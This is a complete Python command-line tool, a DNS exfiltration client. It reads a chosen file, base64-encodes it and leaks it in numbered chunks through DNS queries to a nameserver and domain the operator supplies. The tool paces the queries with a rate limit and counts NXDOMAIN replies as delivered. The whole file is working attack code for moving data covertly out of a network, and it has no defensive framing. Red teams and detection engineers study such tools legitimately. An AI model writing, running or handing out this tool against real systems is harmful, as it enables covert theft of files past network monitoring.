#!/usr/bin/env python3

import dns.resolver
import base64
import argparse
import os
import time
from typing import List, Optional
from logger import setup_logger
from config import ServerConfig, load_config

class DNSExfiltrationClient:
    def __init__(self, config: ServerConfig, logger):
        self.config = config
        self.logger = logger
        self.resolver = dns.resolver.Resolver()
        # DNS labels are limited to 63 characters, so we need to account for chunk ID and domain
        self.chunk_size = 30  # Reduced chunk size to ensure we stay within DNS label limits
        self.total_sent = 0
        self.rate_limit_delay = 60 / config.rate_limit

    def setup_resolver(self, nameservers: List[str], port: int):
        """Configure the DNS resolver with the specified nameservers and port."""
        try:
            resolved_nameservers = []
            for ns in nameservers:
                try:
                    resolved = dns.resolver.resolve(ns, 'A')
                    resolved_nameservers.extend([str(r) for r in resolved])
                except:
                    resolved_nameservers.append(ns)
            
            self.resolver.nameservers = resolved_nameservers
            self.resolver.port = port
            self.logger.info(f"Configured resolver with nameservers: {resolved_nameservers}, port: {port}")
        except Exception as e:
            self.logger.error(f"Failed to configure resolver: {e}")
            raise

    def chunk_data(self, data: str) -> List[str]:
        """Split data into chunks of specified size."""
        # First encode the data to base64
        encoded_data = base64.b64encode(data.encode()).decode()
        # Then split into chunks
        return [encoded_data[i:i + self.chunk_size] for i in range(0, len(encoded_data), self.chunk_size)]

    def validate_file(self, file_path: str) -> None:
        """Validate the input file."""
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
        
        file_size = os.path.getsize(file_path)
        if file_size > self.config.max_total_size:
            raise ValueError(f"File size ({file_size} bytes) exceeds maximum allowed size ({self.config.max_total_size} bytes)")

    def send_chunk(self, chunk_id: int, chunk: str, domain: str) -> bool:
        """Send a single chunk of data via DNS query."""
        try:
            # Ensure the chunk ID doesn't make the label too long
            chunk_id_str = str(chunk_id).zfill(3)  # Pad with zeros to ensure consistent length
            query_name = f"{chunk_id_str}-{chunk}.{domain}"
            
            # Verify the label length
            if len(chunk) > 63 - len(chunk_id_str) - 1:  # -1 for the hyphen
                self.logger.error(f"Chunk {chunk_id} is too long: {len(chunk)} characters")
                return False
                
            self.logger.debug(f"Sending chunk {chunk_id} to {query_name}")
            
            query_resolver = dns.resolver.Resolver()
            query_resolver.nameservers = self.resolver.nameservers
            query_resolver.port = self.resolver.port
            query_resolver.timeout = 2.0
            query_resolver.lifetime = 2.0
            
            try:
                result = query_resolver.resolve(query_name, 'A')
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id}")
                time.sleep(self.rate_limit_delay)
                return True
            except dns.resolver.NXDOMAIN:
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NXDOMAIN response)")
                time.sleep(self.rate_limit_delay)
                return True
            except dns.resolver.NoAnswer:
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NoAnswer response)")
                time.sleep(self.rate_limit_delay)
                return True
            except Exception as e:
                self.logger.error(f"DNS query failed for chunk {chunk_id}: {e}")
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to send chunk {chunk_id}: {e}")
            return False

    def exfiltrate_file(self, file_path: str, domain: str) -> bool:
        """Exfiltrate a file through DNS queries."""
        try:
            self.validate_file(file_path)
            
            with open(file_path, 'r') as file:
                file_data = file.read()

            chunks = self.chunk_data(file_data)
            
            self.logger.info(f"Starting exfiltration of {file_path} ({len(chunks)} chunks)")
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                if self.send_chunk(i, chunk, domain):
                    success_count += 1
                    self.logger.info(f"Progress: {success_count}/{len(chunks)} chunks sent")
            
            success_rate = (success_count / len(chunks)) * 100
            self.logger.info(f"Exfiltration complete. Success rate: {success_rate:.2f}%")
            
            return success_count == len(chunks)
            
        except Exception as e:
            self.logger.error(f"Exfiltration failed: {e}")
            return False

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration client.")
    parser.add_argument("-f", "--file", required=True, help="Path to the file to exfiltrate.")
    parser.add_argument("--nameservers", default="127.0.0.1", 
                      help="Comma-separated list of nameservers. Default is '127.0.0.1'.")
    parser.add_argument("-d", "--domain", required=True, 
                      help="Domain to query data with. Example: google.com")
    parser.add_argument("-p", "--port", type=int, default=53, 
                      help="Server listening port.")
    parser.add_argument("-c", "--config", help="Path to configuration file.")
    return parser.parse_args()

def main():
    """Main function to run the DNS exfiltration client."""
    try:
        args = parse_args()
        
        # Setup logging
        logger = setup_logger()
        
        # Load configuration
        config = load_config(args.config)
        
        # Create client
        client = DNSExfiltrationClient(config, logger)
        
        # Setup resolver
        nameservers = [ns.strip() for ns in args.nameservers.split(',')]
        client.setup_resolver(nameservers, args.port)
        
        # Start exfiltration
        success = client.exfiltrate_file(args.file, args.domain)
        
        if not success:
            logger.error("Exfiltration failed")
            exit(1)
            
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
